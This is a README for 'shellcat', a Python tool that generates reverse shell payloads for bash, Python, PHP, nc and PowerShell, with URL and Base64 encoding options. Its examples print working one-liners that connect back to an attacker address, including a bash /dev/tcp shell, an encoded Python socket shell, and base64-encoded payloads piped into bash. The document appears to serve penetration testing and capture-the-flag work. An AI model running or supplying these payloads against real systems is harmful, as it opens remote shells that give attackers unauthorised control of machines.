# shellcat

shellcat is a python tool for generating reverse shell payloads. It supports a variety of shell types, including bash, python, php, powershell, and more. It also provides options for URL encoding, Base64 encoding, writing the payload to a file, and copying the payload to the clipboard.

## Installation
### Prerequisites
Before installing shellcat, make sure you have `xclip` installed on your system. This is necessary for clipboard functionality. You can install xclip using the following command:

```
sudo apt-get install xclip
```

### Installing Shellcat via pip
```
pip3 install shellcat
```
After installation, you can start using shellcat by simply typing `shellcat` in your terminal.

### Installation from GitHub Repository

Clone the repository:

```
git clone https://github.com/seriotonctf/shellcat.git
```

Navigate to the shellcat directory:

```
cd shellcat
```

Install the required Python packages:

```
pip3 install -r requirements.txt
```

## Usage

```
python3 shellcat.py <shell_type> <ip> <port> [options]
```

```
usage: shellcat.py [-h] [-e] [-b] [-w FILENAME] [-c] shell_type ip port

Generate reverse shell payload

positional arguments:
  shell_type                     Type of the shell (bash, python, php, nc, powershell, ...)
  ip                             IP address of the attacker
  port                           Port to listen on

options:
  -h, --help                     show this help message and exit
  -e, --encode                   URL encode the payload
  -b, --base64                   Base64 encode the payload
  -w FILENAME, --write FILENAME  Write the payload to a file
  -c, --copy                     Copy the payload to clipboard
```

## Examples

Generate a bash reverse shell payload:

```
➜  python shellcat.py bash 10.10.10.10 1234
[+] Payload: bash -i >& /dev/tcp/10.10.10.10/1234 0>&1
```

Generate a python reverse shell payload, URL encode it, and copy it to the clipboard:

```
➜  python shellcat.py python 10.10.10.10 1234 -e -c
[+] Payload: python3+-c+%27import+socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.10.10%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B+os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport+pty%3B+pty.spawn%28%22bash%22%29%27
```

Generate a php reverse shell payload, Base64 encode it, and write it to a file:

```
➜  python shellcat.py php 10.10.10.10 1234 -b -w shell.php
[+] Payload: echo cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjEwLjEwLjEwIiwxMjM0KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc= | base64 -d | bash
[+] Payload written to shell.php
```

Generate a nc reverse shell payload, URL encode it, Base64 encode it, write it to a file, and copy it to the clipboard:

```
➜  python shellcat.py nc 10.10.10.10 1234 -e -b -w payload.txt -c
[+] Payload: echo bmMrLWUrJTJGYmluJTJGc2grMTAuMTAuMTAuMTArMTIzNA== | base64 -d | bash
[+] Payload written to payload.txt
```

Generate a PowerShell reverse shell payload by passing the tun0 interface
```
➜  python3 shellcat.py powershell tun0 1234
[+] Payload: powershell -ec BASE64_ENCODED_PAYLOAD
```
